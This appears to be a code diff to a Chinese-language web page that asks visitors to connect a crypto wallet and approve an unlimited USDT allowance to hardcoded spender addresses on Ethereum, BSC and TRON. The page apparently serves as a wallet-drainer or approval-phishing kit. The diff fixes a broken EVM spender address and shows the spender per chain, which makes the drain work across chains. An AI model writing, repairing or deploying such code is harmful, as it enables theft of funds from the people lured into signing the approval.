@@ -192,6 +192,12 @@
             word-break: break-all;
             margin-top: 4px;
         }
+        .info-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 12px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -212,7 +218,7 @@
             
             <div class="info-box">
                 <div class="info-label">授权地址</div>
-                <div class="info-value">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
+                <div class="info-value" id="spenderDisplay">-</div>
                 <div class="info-label" style="margin-top: 12px;">授权额度</div>
                 <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度</div>
             </div>
@@ -223,7 +229,7 @@
             
             <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
             <div class="status hidden" id="status"></div>
-            <div id="infoText" class="info-text" style="font-size: 12px; color: #999; margin-top: 12px; text-align: center;">请选择链和钱包</div>
+            <div id="infoText" class="info-text">请选择链和钱包</div>
         </div>
     </div>
 
@@ -245,14 +251,17 @@
         
         // USDT 合约地址
         const USDT_ADDRESS = {
-            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-            56: '0x55d398326f99059fF775485246999027B3197955',
-            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',   // Ethereum USDT
+            56: '0x55d398326f99059fF775485246999027B3197955',  // BSC USDT
+            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'    // TRON USDT
         };
         
-        // 授权目标地址（EVM 链需要转换为 0x 开头，这里仅作示例，实际使用时需替换为真实 EVM 地址）
-        const SPENDER_ADDRESS_EVM = '0x' + 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'.slice(2);  // 实际应为有效的 EVM 地址，此处演示
-        const SPENDER_ADDRESS_TRON = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
+        // 授权地址（分别定义，方便后续独立修改）
+        const SPENDER_ADDRESS = {
+            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',     // Ethereum 授权地址
+            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',    // BSC 授权地址（目前与 Ethereum 相同，可单独修改）
+            728126428: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'      // TRON 授权地址
+        };
         
         // 无限额度
         const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
@@ -293,6 +302,11 @@
         
         function updateInfoText(text) {
             document.getElementById('infoText').textContent = text;
+        }
+        
+        function updateSpenderDisplay(chainId) {
+            const addr = SPENDER_ADDRESS[chainId];
+            document.getElementById('spenderDisplay').textContent = addr;
         }
         
         // ==================== UI 渲染 ====================
@@ -369,7 +383,7 @@
             
             const chainId = parseInt(currentChain);
             const usdtAddress = USDT_ADDRESS[chainId];
-            const spender = SPENDER_ADDRESS_EVM;
+            const spender = SPENDER_ADDRESS[chainId];
             
             showStatus('正在构造授权交易...', 'loading');
             try {
@@ -431,7 +445,7 @@
                 const contract = await tronWeb.contract().at(USDT_ADDRESS[728126428]);
                 showStatus('请在钱包中确认授权...', 'loading');
                 const result = await contract.approve(
-                    SPENDER_ADDRESS_TRON,
+                    SPENDER_ADDRESS[728126428],
                     UNLIMITED_AMOUNT_TRON
                 ).send();
                 if (result && (result.result || result.txid)) {
@@ -478,6 +492,7 @@
             document.getElementById('approveBtn').textContent = '授权 USDT';
             document.getElementById('walletList').innerHTML = '';
             renderWalletList();
+            updateSpenderDisplay(chainId);
             hideStatus();
             
             const isTron = parseInt(chainId) === 728126428;
